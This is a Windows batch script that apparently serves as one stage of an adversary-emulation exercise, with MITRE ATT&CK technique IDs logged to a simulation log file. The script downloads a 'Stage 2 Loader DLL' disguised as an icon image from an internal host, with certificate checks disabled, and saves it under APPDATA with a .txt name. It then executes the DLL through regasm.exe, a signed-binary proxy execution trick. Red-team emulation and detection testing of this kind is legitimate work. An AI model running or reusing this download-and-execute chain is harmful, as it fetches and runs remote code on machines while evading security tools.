@echo off
SETLOCAL EnableDelayedExpansion

REM Placeholder constant declarations (random-named SET vars)
SET qwz=%APPDATA%\11027\8adfa38a
SET mnb=3657793a.txt
SET vbn=https://10.0.0.49/stage/2/icon.png?11027-7
SET plk=ITZEL-S2BO
SET oij=11027
SET uyt=7
SET rty=%PUBLIC%\\macula-simulations.log

REM Cache timestamp once
SET tsvar=!DATE!/!TIME!

REM --- Debug: heartbeat start ---
echo [!tsvar!][DEBUG][!plk!][!oij!]: heartbeat_start>> "!rty!" 2>nul

REM Step 1: Heartbeat fetch — download Stage 2 Loader DLL
curl -k -s -o "!qwz!\!mnb!" "!vbn!"
SET hb_err=%errorlevel%
if !hb_err! neq 0 (
    SET hb_res=FAIL
    SET hb_err_msg=curl_failed
) else (
    SET hb_res=OK
    SET hb_err_msg=
)

REM Debug: heartbeat complete
echo [!tsvar!][DEBUG][!plk!][!oij!]: heartbeat_complete>> "!rty!" 2>nul
if "!hb_res!"=="FAIL" (
    echo [!tsvar!][DEBUG][!plk!][!oij!]: heartbeat_result=!hb_err!>> "!rty!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!plk!][!oij!]: heartbeat_result=0>> "!rty!" 2>nul
)

REM Debug: chdir start
echo [!tsvar!][DEBUG][!plk!][!oij!]: chdir_start>> "!rty!" 2>nul

REM Step 2: Change working directory
cd /d "!qwz!" >nul 2>&1
SET cd_err=%errorlevel%

REM Debug: chdir result
echo [!tsvar!][DEBUG][!plk!][!oij!]: chdir_result=!cd_err!>> "!rty!" 2>nul

REM Debug: regasm start
echo [!tsvar!][DEBUG][!plk!][!oij!]: regasm_start>> "!rty!" 2>nul

REM Step 3: Invoke Stage 2 Loader DLL via regasm.exe /U
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /codebase "!qwz!\!mnb!" >NUL 2>&1
SET reg_err=%errorlevel%
if !reg_err! neq 0 (
    SET reg_res=FAIL
    SET reg_err_msg=regasm_failed
) else (
    SET reg_res=OK
    SET reg_err_msg=
)

REM Debug: regasm result
echo [!tsvar!][DEBUG][!plk!][!oij!]: regasm_result=!reg_err!>> "!rty!" 2>nul

REM Step 4: Logging — TTP lines
SET t1218_res=!reg_res!
SET t1218_err=!reg_err_msg!
SET t1027_res=!hb_res!
SET t1027_err=!hb_err_msg!

echo [!tsvar!][TTP][!plk!][!oij!]: T1218^|System Binary Proxy Execution=!t1218_res!:!t1218_err!>> "!rty!" 2>nul
echo [!tsvar!][TTP][!plk!][!oij!]: T1027^|Obfuscated Files or Information=!t1027_res!:!t1027_err!>> "!rty!" 2>nul

ENDLOCAL